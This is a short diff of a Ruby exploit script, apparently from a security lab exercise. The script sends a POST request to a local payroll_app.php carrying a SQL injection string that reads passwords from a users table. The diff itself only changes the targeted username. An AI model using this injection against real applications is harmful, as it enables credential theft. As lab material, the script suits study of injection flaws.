@@ -2,7 +2,7 @@ require 'net/http'
 
 url  = "http://127.0.0.1/payroll_app.php"
 uri  = URI(url)
-user = 'Adam.Garrett'
+user = 'Shannon.Garland'
 injection = "password'; select password from users where username='' OR ''='"
 
 puts "Making POST request to #{uri} with the following parameters:"
